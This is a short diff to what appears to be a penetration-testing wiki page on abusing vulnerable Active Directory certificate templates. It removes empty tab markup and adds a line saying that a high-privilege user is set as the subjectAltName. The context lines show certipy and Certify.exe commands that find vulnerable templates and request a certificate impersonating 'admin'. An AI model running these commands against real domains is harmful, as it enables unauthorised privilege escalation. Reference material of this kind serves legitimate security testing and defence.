@@ -36,19 +36,7 @@ certipy 'domain.local'/'user':'password'@'ca_server' req -ca 'ca_name' -template
 
 
 
-
-
-{% tabs %}
-{% tab title="Windows" %}
 The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
-{% endtab %}
-{% endtabs %}
-
-{% tabs %}
-{% tab title="Windows" %}
-
-{% endtab %}
-{% endtabs %}
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -62,7 +50,7 @@ Certify.exe find /vulnerable
 Certify.exe find /vulnerable /currentuser
 ```
 
-Once a vulnerable template is found, a request shall be made to obtain a certificate.
+Once a vulnerable template is found, a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).
 
 ```batch
 Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"
